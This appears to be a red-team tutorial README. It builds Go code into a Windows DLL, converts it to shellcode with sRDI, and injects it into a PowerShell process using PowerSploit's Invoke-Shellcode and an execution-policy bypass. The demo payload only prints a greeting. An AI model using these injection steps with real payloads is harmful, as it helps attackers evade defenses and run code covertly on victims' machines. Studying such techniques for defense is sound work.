# DLL shellcode from GO

Generate two files, an archive file called `dllshellcode.a` and an associated header file called `dllshellcode.h`.

```sh
$ go build -buildmode=c-archive
```

Build a DLL from the C code.

```sh
$ gcc -shared -pthread -o x.dll scratch.c dllshellcode.a -lWinMM -lntdll -lWS2_32
```

To convert our DLL into shellcode, we’ll use [sRDI](https://github.com/monoxgas/sRDI/), an excellent utility that has a ton of functionality. From the sRDI directory, execute a python3 shell. Use the following code to generate a hash of the exported function:

```python
> from ShellCodeRDI import *; HashFunctionName('Start')
1168596138
```

The sRDI tools will use the hash to identify a function from the shellcode we’ll generate later.

Next, we’ll leverage PowerShell utilities to generate and execute shellcode. For convenience, we will use some utilities from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/).

```powershell
c:\tools\PowerSploit\CodeExecution> powershell.exe -exec bypass
PS C:\tools\PowerSploit\CodeExecution> Import-Module .\Invoke-Shellcode.ps1
PS C:\tools\PowerSploit\CodeExecution> cd ..\..\sRDI
PS C:\tools\sRDI> cd .\PowerShell\
PS C:\tools\sRDI\PowerShell> Import-Module .\ConvertTo-Shellcode.ps1
```

With both modules imported, we can use `ConvertTo-Shellcode` from sRDI to generate shellcode from the DLL, and then pass this into `Invoke-Shellcode` from PowerSploit to demonstrate the injection. Once this executes, you should observe your Go code executing:

```powershell
PS C:\tools\sRDI\PowerShell> Invoke-Shellcode -Shellcode (ConvertTo-Shellcode -File C:\Users\tom\Downloads\x.dll -FunctionHash 1168596138)

Injecting shellcode into the running PowerShell process!
Do you wish to carry out your evil plans?
[Y] Yes [N] No [S] Suspend [?] Help (default is "Y"): Y
YO FROM GO
```
